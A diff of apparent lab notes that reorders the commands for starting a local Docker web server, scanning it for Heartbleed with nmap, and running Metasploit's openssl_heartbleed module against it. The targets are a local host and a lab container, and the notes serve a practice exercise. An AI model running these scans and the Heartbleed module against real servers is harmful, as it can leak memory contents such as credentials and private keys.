@@ -1,18 +1,22 @@
-# Start the attacker container image
-docker compose run attacker bash
-# Or
-docker-compose run attacker bash
-
 # Start web server
 docker-compose up -d web-server
 
+# Scan web server using nmap from the local machine
+sudo nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1
+
 
 # Scan heartbleed vulnerability from the attacker container
-nmap -sV -p 443 --script=ssl-heartbleed web-server
-nmap -sV -p 443 --script=ssl-heartbleed IP-adder-of-web-server
+docker run --rm -it instrumentisto/nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1
 
-# Scan from local machine not container
-sudo nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1
+
+# Run Metasploit console in a container
+docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
+
+use auxiliary/scanner/ssl/openssl_heartbleed
+set VERBOSE true
+set RHOSTS web-server
+set RPORT 443
+exploit
 
 
 # Install Metasploit on Linux / macOS (AWS Ubuntu)
@@ -31,13 +35,14 @@ set RPORT 8443
 exploit
 
 
-# Run Metasploit on attacker container
-msfconsole
 
-use auxiliary/scanner/ssl/openssl_heartbleed
-set VERBOSE true
-set RHOSTS web-server
-set RPORT 443
-exploit
 
+
+
+
+
+# No longer needed: start the attacker container image
+docker compose run attacker bash
+# Or
+docker-compose run attacker bash
 
